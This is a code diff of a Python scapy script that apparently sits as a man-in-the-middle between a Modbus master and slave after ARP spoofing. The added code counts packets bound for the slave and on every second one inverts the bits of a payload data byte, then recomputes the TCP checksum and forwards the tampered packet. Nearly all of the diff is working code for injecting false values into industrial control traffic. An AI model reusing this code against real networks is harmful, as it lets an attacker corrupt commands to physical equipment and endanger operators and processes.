@@ -8,9 +8,11 @@ from scapy.all import *
 
 # we will need to arpspoof first 
 
-
 # Define the network interfaces to listen on and forward packets to
 listen_interface = "eno2"
+
+# modify each 10nth packet 
+MODIFY_NTH_PACKET = 2
 
 #
 real_master_ip = '192.168.88.250' # 1C:69:7A:08:86:1A
@@ -21,9 +23,13 @@ real_master_mac = '1c:69:7a:08:86:1a' # 1C:69:7A:08:86:1A
 slave_mac       = 'b8:27:eb:1e:08:59' # b8:27:eb:1e:08:59
 MIM_mac         = '8c:04:ba:08:73:03' # 8c:04:ba:08:73:03
 
+packet_num=0
+
 # Define the function that will be called for each received packet
 def handle_packet(packet):
-    
+    # count packets 
+    global packet_num
+
     # not an ethernet packet 
     if not packet.haslayer(Ether):
         return
@@ -42,10 +48,46 @@ def handle_packet(packet):
             packet = packet_for_slave(packet)
         else:
            return
-    
+   
+    # modify each nth packet that is going to slave 
+    if packet[Ether].dst == slave_mac: 
+        packet_num += 1
+        if packet_num % MODIFY_NTH_PACKET == 0:
+            packet = change_packet(packet)
+
     # send packet 
     sendp(packet, iface=listen_interface)
+
+## Change data part of modbus packet 
+def change_packet(packet):
+    print("change")
+    print(packet.show())
+    if len(packet[TCP].payload) != 12:
+        return packet 
+
+    print(len(packet[TCP].payload))
+    tcp_payload = packet[TCP].payload.load
+    print(tcp_payload.hex())
     
+    ## 11-12 byte is data 
+    
+    # Invert the bits of the 11th byte
+    byte_index = 10 # 0-based indexing
+    inverted_byte = bytes([~tcp_payload[byte_index] & 0xff])
+    tcp_payload = tcp_payload[:byte_index] + inverted_byte + tcp_payload[byte_index+1:]
+    
+    # Print the modified payload
+    print(tcp_payload.hex())
+    
+    # Update the packet with the modified payload
+    packet[TCP].payload.load = bytes(tcp_payload)
+   
+    # Recalculate TCP checksum
+    del packet[TCP].chksum
+    packet[TCP].chksum_relaxed = 0 
+
+    return packet 
+
 
 # Prepare packet that has master destination 
 def packet_for_master(packet):
